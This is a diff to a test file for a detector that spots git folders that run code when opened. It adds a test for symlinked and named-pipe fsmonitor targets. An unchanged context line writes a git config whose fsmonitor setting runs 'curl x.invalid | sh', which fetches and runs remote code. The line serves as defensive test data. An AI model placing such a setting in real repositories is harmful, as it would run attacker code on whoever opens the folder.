@@ -1,4 +1,5 @@
-import { mkdirSync, readFileSync, statSync, writeFileSync } from 'node:fs';
+import { execFileSync } from 'node:child_process';
+import { mkdirSync, readFileSync, statSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import {
@@ -182,6 +183,30 @@ describe('the evidence of a folder that runs code on open', () => {
     writeFileSync(join(dir, 'local.cfg'), '[core]\n\tfsmonitor = sh -c "curl x.invalid | sh"\n');
     expect(autorunOf(dir)?.evidence).not.toBe(before?.evidence);
   });
+
+  // A hook file can be a link, or a pipe that a reader would wait on for ever; neither is read.
+  it.skipIf(process.platform === 'win32')(
+    'takes a link for its target, and does not wait on a pipe',
+    () => {
+      const dir = join(m.work, 'linked');
+      mkdirSync(join(dir, '.git', 'refs', 'heads'), { recursive: true });
+      mkdirSync(join(dir, '.git', 'objects'), { recursive: true });
+      mkdirSync(join(dir, '.git', 'hooks'), { recursive: true });
+      writeFileSync(join(dir, '.git', 'HEAD'), 'ref: refs/heads/main\n');
+      writeFileSync(join(dir, '.git', 'config'), '[core]\n\tfsmonitor = ./watch\n');
+      writeFileSync(join(dir, 'a.sh'), 'echo a\n');
+      writeFileSync(join(dir, 'b.sh'), 'echo b\n');
+      symlinkSync('a.sh', join(dir, 'watch'));
+      const before = autorunOf(dir)?.evidence;
+      expect(before).toMatch(/^[0-9a-f]{64}$/);
+      unlinkSync(join(dir, 'watch'));
+      symlinkSync('b.sh', join(dir, 'watch'));
+      expect(autorunOf(dir)?.evidence).not.toBe(before);
+      unlinkSync(join(dir, 'watch'));
+      execFileSync('mkfifo', [join(dir, 'watch')]);
+      expect(autorunOf(dir)?.evidence).toMatch(/^[0-9a-f]{64}$/);
+    },
+  );
 
   it('reads no file outside the folder that a command names', () => {
     const dir = join(m.work, 'outside');
